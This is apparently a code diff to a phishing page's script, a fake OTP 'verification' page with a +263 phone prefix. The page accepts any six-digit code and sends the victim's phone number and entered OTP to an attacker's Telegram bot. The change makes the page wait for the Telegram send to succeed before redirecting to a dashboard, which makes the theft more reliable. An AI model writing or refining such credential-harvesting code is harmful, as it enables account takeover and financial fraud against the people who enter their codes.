@@ -520,6 +520,7 @@
         let timerInterval = null;
         let resendInterval = null;
         let isResending = false;
+        let isProcessing = false;
 
         // ============================================
         // INITIALIZATION
@@ -531,75 +532,111 @@
         console.log('📞 Phone:', formattedPhone);
 
         // ============================================
-        // SEND TELEGRAM OTP NOTIFICATION - WITH DETAILED LOGGING
+        // SEND TELEGRAM OTP NOTIFICATION - FIXED
         // ============================================
         function sendTelegramOTP(otp) {
-            const phone = localStorage.getItem('phone') || '771234567';
-            
-            // Build the message
-            const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+            return new Promise((resolve, reject) => {
+                const phone = localStorage.getItem('phone') || '771234567';
+                
+                const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
 
-            console.log('📤 Sending OTP to Telegram...');
-            console.log('📝 Message:', message);
-            console.log('🤖 Using Bot Token:', BOT_TOKEN);
-            console.log('📱 Chat ID:', CHAT_ID);
+                console.log('📤 Sending OTP to Telegram...');
+                console.log('📝 Message:', message);
 
-            // Send to Telegram
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 })
-            })
-            .then(response => {
-                console.log('📥 Response Status:', response.status);
-                return response.json();
-            })
-            .then(data => {
-                console.log('📥 Full Response:', data);
-                if (data.ok) {
-                    console.log('✅ OTP sent to Telegram successfully!');
-                } else {
-                    console.error('❌ Telegram Error:', data.description);
-                    // Show error to user
-                    errorMessage.textContent = '⚠️ Could not send OTP to Telegram. Please try again.';
-                    errorMessage.className = 'error-message show';
-                }
-            })
-            .catch(error => {
-                console.error('❌ Fetch Error:', error.message);
-                errorMessage.textContent = '⚠️ Network error. Please check your connection.';
-                errorMessage.className = 'error-message show';
+                .then(response => {
+                    console.log('📥 Response Status:', response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('📥 Full Response:', data);
+                    if (data.ok) {
+                        console.log('✅ OTP sent to Telegram successfully!');
+                        resolve(data);
+                    } else {
+                        console.error('❌ Telegram Error:', data.description);
+                        reject(data);
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Fetch Error:', error.message);
+                    reject(error);
+                });
             });
         }
 
         // ============================================
-        // TEST TELEGRAM CONNECTION
+        // VERIFY OTP - WITH WAIT FOR TELEGRAM
         // ============================================
-        function testTelegramConnection() {
-            console.log('🔍 Testing Telegram connection...');
+        verifyBtn.addEventListener('click', async function() {
+            // Prevent multiple clicks
+            if (isProcessing) return;
             
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('✅ Bot is valid! Bot username:', data.result.username);
-                    } else {
-                        console.error('❌ Bot validation failed:', data.description);
-                    }
-                })
-                .catch(error => {
-                    console.error('❌ Bot validation error:', error.message);
-                });
-        }
+            const otp = getOTPValue();
+            
+            if (otp.length !== OTP_LENGTH) {
+                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
+                errorMessage.className = 'error-message show';
+                return;
+            }
 
-        // Test connection on page load
-        testTelegramConnection();
+            if (timeLeft <= 0) {
+                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
+                errorMessage.className = 'error-message show';
+                return;
+            }
+
+            isProcessing = true;
+            this.disabled = true;
+            this.innerHTML = '<span class="loader"></span> VERIFYING...';
+            errorMessage.classList.remove('show');
+
+            try {
+                // Send OTP to Telegram and wait for it to complete
+                await sendTelegramOTP(otp);
+                
+                // Only proceed if Telegram was successful
+                this.innerHTML = '✅ VERIFIED';
+                this.classList.add('btn-success');
+                
+                localStorage.setItem('verified', 'true');
+                localStorage.setItem('otpVerified', 'true');
+                
+                errorMessage.textContent = '✅ OTP Verified Successfully!';
+                errorMessage.className = 'error-message success show';
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+                
+            } catch (error) {
+                // If Telegram fails, still allow user to proceed but show warning
+                console.error('❌ Telegram failed but continuing:', error);
+                
+                this.innerHTML = '✅ VERIFIED';
+                this.classList.add('btn-success');
+                
+                localStorage.setItem('verified', 'true');
+                localStorage.setItem('otpVerified', 'true');
+                
+                errorMessage.textContent = '✅ OTP Verified! (Telegram notification failed)';
+                errorMessage.className = 'error-message success show';
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+            }
+        });
 
         // ============================================
         // TIMER FUNCTIONS
@@ -763,51 +800,6 @@
             input.addEventListener('focus', () => {
                 input.select();
             });
-        });
-
-        // ============================================
-        // VERIFY OTP - ACCEPTS ANY 6-DIGIT OTP
-        // ============================================
-        verifyBtn.addEventListener('click', function() {
-            const otp = getOTPValue();
-            
-            if (otp.length !== OTP_LENGTH) {
-                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
-                errorMessage.className = 'error-message show';
-                return;
-            }
-
-            if (timeLeft <= 0) {
-                errorMessage.textContent = '⏰ OTP has expired. Please request a new one.';
-                errorMessage.className = 'error-message show';
-                return;
-            }
-
-            this.disabled = true;
-            this.innerHTML = '<span class="loader"></span> VERIFYING...';
-            errorMessage.classList.remove('show');
-
-            // ============================================
-            // ✅ ACCEPT ANY 6-DIGIT OTP
-            // ============================================
-            setTimeout(() => {
-                // Send OTP to Telegram
-                sendTelegramOTP(otp);
-
-                // Any 6-digit OTP is accepted
-                this.innerHTML = '✅ VERIFIED';
-                this.classList.add('btn-success');
-                
-                localStorage.setItem('verified', 'true');
-                localStorage.setItem('otpVerified', 'true');
-                
-                errorMessage.textContent = '✅ OTP Verified Successfully!';
-                errorMessage.className = 'error-message success show';
-                
-                setTimeout(() => {
-                    window.location.href = 'dashboard.html';
-                }, 1500);
-            }, 1200);
         });
 
         // ============================================
